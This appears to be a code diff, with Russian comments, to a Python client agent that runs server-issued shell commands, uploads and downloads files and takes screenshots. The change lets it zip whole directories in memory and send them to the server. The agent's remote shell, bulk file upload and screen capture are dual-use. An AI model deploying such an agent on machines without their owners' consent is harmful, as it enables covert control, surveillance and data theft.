@@ -2,7 +2,8 @@
 
 Поддерживает команды:
   - exec       — выполнить shell-команду (payload), вернуть stdout/stderr
-  - get        — отдать файл с клиента (payload = путь на клиенте)
+  - get        — отдать файл/директорию с клиента (payload = путь;
+                 директория шлётся как <name>.zip)
   - post       — принять файл от сервера (payload = путь назначения на клиенте)
   - screenshot — снимок экрана(ов) PNG
 
@@ -24,6 +25,7 @@ import sys
 import time
 import traceback
 import uuid
+import zipfile
 from pathlib import Path
 from typing import Optional
 
@@ -238,16 +240,61 @@ def handle_exec(cmd: dict, client: Client) -> dict:
     }
 
 
+def _zip_dir(root: Path) -> tuple[bytes, int, int, list[str]]:
+    """Запаковать директорию в zip в памяти.
+
+    Возвращает (bytes, n_files, n_skipped, list_of_skip_reasons).
+    Структура внутри архива относительно `root.parent`, т.е. сама папка
+    становится корнем — `root.name/...`.
+    """
+    buf = io.BytesIO()
+    n_files = 0
+    skipped: list[str] = []
+    base = root.parent
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for dirpath, _dirnames, filenames in os.walk(root):
+            for fn in filenames:
+                full = Path(dirpath) / fn
+                arcname = full.relative_to(base).as_posix()
+                try:
+                    zf.write(full, arcname)
+                    n_files += 1
+                except OSError as e:
+                    skipped.append(f"{full}: {e}")
+    return buf.getvalue(), n_files, len(skipped), skipped
+
+
 def handle_get(cmd: dict, client: Client) -> dict:
-    """Отдать файл с клиента на сервер."""
+    """Отдать файл или директорию с клиента на сервер.
+
+    Директория упаковывается в zip в памяти, имя архива — `<dirname>.zip`.
+    """
     path = (cmd.get("payload") or "").strip()
     if not path:
-        return {"status": "error", "output": "payload должен быть путём к файлу"}
+        return {"status": "error", "output": "payload должен быть путём к файлу или директории"}
     p = Path(path).expanduser()
     if not p.exists():
-        return {"status": "error", "output": f"файл не найден: {p}"}
+        return {"status": "error", "output": f"путь не найден: {p}"}
+
+    if p.is_dir():
+        try:
+            data, n_files, n_skipped, skipped = _zip_dir(p)
+        except OSError as e:
+            return {"status": "error", "output": f"ошибка архивирования: {e}"}
+        out = f"архив {p} → {p.name}.zip ({len(data)} bytes, {n_files} файлов)"
+        if n_skipped:
+            out += f"\nпропущено {n_skipped}:\n" + "\n".join(skipped[:20])
+            if n_skipped > 20:
+                out += f"\n... ещё {n_skipped - 20}"
+        return {
+            "status": "done",
+            "output": out,
+            "file_bytes": data,
+            "file_name": f"{p.name}.zip",
+        }
+
     if not p.is_file():
-        return {"status": "error", "output": f"не файл: {p}"}
+        return {"status": "error", "output": f"не файл и не директория: {p}"}
     try:
         data = p.read_bytes()
     except OSError as e:
